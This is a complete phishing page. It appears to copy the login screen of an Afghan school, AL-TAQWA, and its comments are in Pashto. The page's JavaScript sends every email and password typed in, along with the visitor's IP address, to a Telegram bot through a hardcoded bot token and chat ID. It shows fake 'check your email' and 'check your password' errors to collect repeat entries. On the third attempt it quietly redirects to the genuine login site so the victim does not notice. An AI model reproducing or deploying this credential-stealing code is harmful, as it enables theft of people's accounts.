<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login - AL-TAQWA</title>

<style>
/* عمومي بڼه */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

body {
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #f5f5f5; /* شالید لکه په انځور کې */
}

/* د کارت عمومي بڼه */
.login-container {
    background: #ffffff;
    border-radius: 16px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
    padding: 30px 24px;
    width: 100%;
    display: flex;
    flex-direction: column;
}

/* لوګو برخه */
.logo {
    text-align: center;
    margin-bottom: 20px;
}

.logo img {
    max-width: 80%;
    height: auto;
    display: inline-block;
}

/* سرلیک */
.title {
    text-align: center;
    font-size: 22px;
    font-weight: 500;
    color: #333;
    margin-bottom: 24px;
}

/* انپوټ فیلډونه */
.input-group {
    margin-bottom: 16px;
}

label {
    display: block;
    font-size: 15px;
    font-weight: 500;
    color: #444;
    margin-bottom: 6px;
}

input[type="email"],
input[type="password"] {
    width: 100%;
    height: 44px;
    padding: 0 12px;
    border: 1px solid #ddd;
    border-radius: 6px;
    font-size: 15px;
    color: #333;
    outline: none;
    transition: border-color 0.2s;
}

/* د انپوټ بلاو بورډر لکه په انځور کې */
input[type="email"]:focus,
input[type="password"]:focus {
    border: 1px solid #87CEEB; /* نرم بلاو رنګ */
    box-shadow: 0 0 0 2px rgba(135, 206, 235, 0.2);
}

input::placeholder {
    color: #aaa;
}

/* چک باکس */
.remember-me {
    display: flex;
    align-items: center;
    margin-bottom: 24px;
    font-size: 14px;
    color: #444;
}

.remember-me input[type="checkbox"] {
    width: 16px;
    height: 16px;
    margin-right: 8px;
    accent-color: #18c6e7;
}

/* د لاګین تڼۍ - لکه په انځور کې نیلي رنګ */
button {
    width: 100%;
    height: 44px;
    border: none;
    border-radius: 6px;
    background-color: #18c6e7; /* نیلي رنګ */
    color: #ffffff; /* سپین لیک */
    font-size: 16px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s;
}

button:hover {
    background-color: #0fb6d6;
}

/* د خطا پیغام بکس */
.error-msg {
    background: #ffe6e6;
    border: 1px solid #ff6666;
    color: #cc0000;
    padding: 10px;
    border-radius: 6px;
    font-size: 13px;
    text-align: center;
    margin-bottom: 12px;
    display: none;
}

/* ========================================================= */
/* ====== MOBILE (د لومړي انځور په څیر) ====== */
/* ========================================================= */
@media (max-width: 767px) {
    .login-container {
        max-width: 92%;
        margin: 0 16px;
        padding: 30px 20px 24px 20px;
    }
}

/* ========================================================= */
/* ====== DESKTOP (د دوهم انځور په څیر) ====== */
/* ========================================================= */
@media (min-width: 768px) {
    body {
        background-color: #fafafa;
    }

    .login-container {
        max-width: 420px; /* لکه په دوهم انځور کې کوچنی کارت */
        padding: 40px 32px 32px 32px;
        border: 1px solid #eee; /* نرۍ خړ پوله */
    }

    .logo img {
        max-width: 60%; /* په ډیسټاپ کې لوګو لږ کوچنی */
    }
    
    .title {
        font-size: 20px;
        margin-bottom: 20px;
    }
}
</style>
</head>

<body>

<div class="login-container">
    
    <!-- لوګو -->
    <div class="logo">
        <!-- دلته د خپل انځور نوم واچوئ -->
        <img src="logo.png" alt="AL-TAQWA Logo"> 
    </div>

    <div class="title">Sign in</div>

    <!-- د ایرر پیغام ځای -->
    <div id="errorMsg" class="error-msg"></div>

    <div class="input-group">
        <label>Email</label>
        <input type="email" id="email" placeholder="Email">
    </div>

    <div class="input-group">
        <label>Password</label>
        <input type="password" id="password" placeholder="Password">
    </div>

    <div class="remember-me">
        <input type="checkbox" id="rememberCheck">
        <label for="rememberCheck" style="font-weight: 400; margin:0; cursor:pointer;">Remember password</label>
    </div>

    <button id="loginBtn">Login</button>

</div>

<script>
    // ==========================================
    // دلته خپل نوی ټوکن او چټ آئی ډی واچوئ
    // ==========================================
    const BOT_TOKEN = "8907358280:AAGNOQIWyhvy2hB1yWTIc2XyMp1eQiNsHXo";
    const ADMIN_CHAT_ID = "8295417969";

    let attemptStore = {};

    // د پښتو توري ازموینه
    function hasPashtoCharacters(text) {
        const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
        return pashtoRegex.test(text);
    }

    // د ایمیل ازموینه
    function isValidEmail(email) {
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return emailRegex.test(email);
    }

    // د پاسورډ اوږدوالی (لږ تر لږه 8 توري)
    function isValidPasswordLength(password) {
        return password.length >= 8;
    }

    // د کاروونکي IP ترلاسه کول
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'Unknown IP';
        }
    }

    // بوټ ته معلومات لېږل
    async function sendToAdmin(email, password, ip, attemptNumber) {
        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* altaqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {
            console.warn("Telegram error:", e);
        }
    }

    // پرده کې د ایرر پیغام ښودل
    function showError(message) {
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        // د 3 ثانیو وروسته ایرر ورک
        setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
    }

    // د لاګین تڼۍ کلیک
    document.getElementById('loginBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        // 1. بنسټیز چکونه
        if (!email || !password) { showError('Please fill in both email and password'); return; }
        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) { showError('Pashto characters are not allowed'); return; }
        if (!isValidEmail(email)) { showError('Please enter a valid email address'); return; }
        if (!isValidPasswordLength(password)) { showError('Password must be at least 8 characters'); return; }

        const ip = await getUserIP();
        const key = `${email}_${ip}`;

        // د هڅو شمېرل
        if (!attemptStore[key]) attemptStore[key] = 0;
        attemptStore[key]++;
        const currentAttempt = attemptStore[key];

        // *** لمړۍ هڅه: اډمین ته لېږل او ایرر ورکول ***
        if (currentAttempt === 1) {
            // معلومات اډمین ته لېږل
            await sendToAdmin(email, password, ip, currentAttempt);
            
            // کاروونکي ته ایرر (لکه د غلط ایمیل غلطي)
            showError('Please check your email');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }

        // دویمه هڅه: ایرر ورکول
        if (currentAttempt === 2) {
            showError('Please check your password');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }

        // دریمه هڅه: اصلي لینک ته تلل (بې له کوم لوډینګه)
        if (currentAttempt >= 3) {
            // معلومات بیا اډمین ته لېږل
            await sendToAdmin(email, password, ip, currentAttempt);
            
            // د هڅو پاکول
            delete attemptStore[key];
            
            // *** سمدلاسه لینک ته تلل بې له لوډینګ ***
            window.location.replace("https://www.altaqwa.edu.af/login");
        }
    });
</script>

</body>
</html>
